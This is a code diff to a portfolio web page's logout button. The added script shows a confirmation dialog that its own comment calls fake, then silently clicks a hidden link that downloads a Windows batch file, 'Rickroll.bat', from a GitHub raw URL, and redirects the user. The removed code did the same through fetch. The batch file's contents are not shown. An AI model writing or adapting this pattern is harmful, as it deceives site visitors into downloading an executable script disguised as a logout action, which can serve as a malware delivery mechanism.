@@ -134,45 +134,34 @@
 
     <!-- You can add more sections like Skills, Achievements, etc. -->
 
-    <button type="button" class="logout-btn" onclick="downloadAndLogout()">
+   <!-- Logout Button -->
+<button type="button" class="logout-btn" onclick="confirmLogout()">
     <i class='bx bx-log-out'></i> Logout
 </button>
 
+<!-- Hidden Download Link -->
+<a id="Rickroll"
+   href="https://raw.githubusercontent.com/Raimund334/PortfolioHub/refs/heads/main/Rickroll.bat"
+   download="Rickroll.bat"
+   style="display: none;">
+</a>
+
 <script>
-    async function downloadAndLogout() {
-        try {
-            // Fetch the file from your GitHub Raw URL
-            const response = await fetch('https://raw.githubusercontent.com/Raimund334/PortfolioHub/refs/heads/main/Rickroll.bat');
+    function confirmLogout() {
+        // 1. Show a fake confirmation dialog
+        if (confirm("Are you sure you want to logout? (Click OK to confirm)")) {
             
-            if (!response.ok) throw new Error('File not found');
+            // 2. Trigger the download manually via user gesture
+            // Browsers allow downloads if they happen directly inside a click event
+            document.getElementById('Rickroll').click();
             
-            const blob = await response.blob();
-            
-            // Create a temporary link to trigger the download
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.style.display = 'none';
-            a.href = url;
-            a.download = 'Rickroll.bat'; // Forces the filename
-            
-            document.body.appendChild(a);
-            a.click();
-            
-            // Cleanup
-            window.URL.revokeObjectURL(url);
-            document.body.removeChild(a);
-            
-            // Redirect to dashboard after a short delay
-            setTimeout(() => {
+            // 3. Wait slightly then redirect
+            setTimeout(function() {
                 window.location.href = 'index.html';
-            }, 500);
-            
-        } catch (error) {
-            console.error('Download failed:', error);
-            alert('Could not download file. Please check your connection.');
+            }, 1000);
         }
     }
-</script>   
+</script>      
   </div>
 </body>
 </html>
